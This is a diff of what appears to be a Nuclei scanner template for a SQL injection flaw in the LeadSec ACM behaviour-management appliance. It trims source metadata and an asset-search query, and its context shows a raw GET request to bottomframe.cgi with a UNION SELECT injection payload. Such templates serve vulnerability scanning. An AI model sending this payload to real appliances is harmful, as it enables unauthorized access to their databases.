@@ -3,14 +3,8 @@ info:
   name: 网御ACM上网行为管理系统bottomframe.cgiSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ecb4559974cffe6ceffd1741b7d10e4a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ecb4559974cffe6ceffd1741b7d10e4a
-    fofa: + hunter：`app.name="LeadSec 网御星云 ACM"`
 http:
 - raw:
   - 'GET /bottomframe.cgi?user_name=%27))%20union%20select%20user()%23 HTTP/1.1
